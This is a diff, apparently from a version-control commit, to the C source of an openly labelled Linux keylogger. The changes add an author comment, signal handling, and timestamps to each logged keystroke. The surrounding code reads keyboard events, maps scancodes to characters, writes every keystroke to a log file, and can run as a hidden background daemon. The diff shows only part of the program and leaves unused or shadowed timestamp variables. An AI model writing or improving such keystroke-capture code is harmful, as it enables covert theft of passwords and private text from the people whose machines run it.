@@ -1,3 +1,7 @@
+/*
+  linux keyloggger
+  @author Liu Mohan
+*/
 #include "keylogger.h"
 #include <regex.h>
 #include <time.h>
@@ -20,6 +24,7 @@ FILE* log_fp;
 int event_fd;
 
 
+// registered to handle SIGINT: release resources and stop logging
 void sigint_handler(int signal_num){
   close(event_fd);
   if(log_fp != NULL){
@@ -82,7 +87,10 @@ static inline void daemon_start(){
   signal(SIGINT, sigint_handler);
 }
 
-// this function is not used in present version
+/*
+XXX this function is not used in present version
+*/
+
 // int find_all_keyboards(device_info* keyboards, int* keyboard_cnt){
 //   int _keyboard_cnt = 0;
 
@@ -160,7 +168,8 @@ static inline void daemon_start(){
 void logger(){
   int shift_pressed = 0;
   int caps_pressed = 0;
-  struct timeval time_stamp;
+  time_t time_stamp;
+  char readable_time;
   fprintf(log_fp, "Start logging\n");
   fflush(log_fp);
   while(1){
@@ -188,8 +197,14 @@ void logger(){
       else{
         table_ptr = normal_scancode_to_ascii;
       }
+
+      // time stamp:
+      #define TIMESTAMP_SIZE 32
+      char time_stamp[TIMESTAMP_SIZE];
+      struct tm * local_time = localtime(&(ev.time.tv_sec));
+      strftime(time_stamp, TIMESTAMP_SIZE, "%Y-%m-%d %H:%M:%S", local_time);
       
-      fprintf(log_fp, ">%s\n", table_ptr[ev.code]);
+      fprintf(log_fp, "%s.%06ld>%s\n",time_stamp, ev.time.tv_usec, table_ptr[ev.code]);
       fflush(log_fp);
     }
     else if(ev.value == 0){
@@ -201,7 +216,6 @@ void logger(){
       }
     }
   }
-  
 }
 
 void start_logging(arguments args){
@@ -228,6 +242,9 @@ void start_logging(arguments args){
   // logger code here:
   if(args.arg_daemon_flag == 0){
     daemon_start();
+  }
+  else{
+    signal(SIGINT, sigint_handler);
   }
 
   logger();
